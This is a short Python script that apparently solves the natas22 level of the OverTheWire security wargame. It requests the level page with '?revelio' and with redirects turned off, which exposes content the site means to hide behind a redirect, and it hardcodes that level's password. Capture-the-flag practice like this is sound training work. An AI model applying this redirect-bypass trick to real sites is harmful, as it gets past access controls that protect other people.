import requests
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth('natas22', '964laB0r7TuDqJj5b3HFtwsQoc0GhjBF')
url = "http://natas22.natas.labs.overthewire.org/index.php?revelio"

r = requests.get(url, auth=basicAuth, allow_redirects=False)
print(r.text)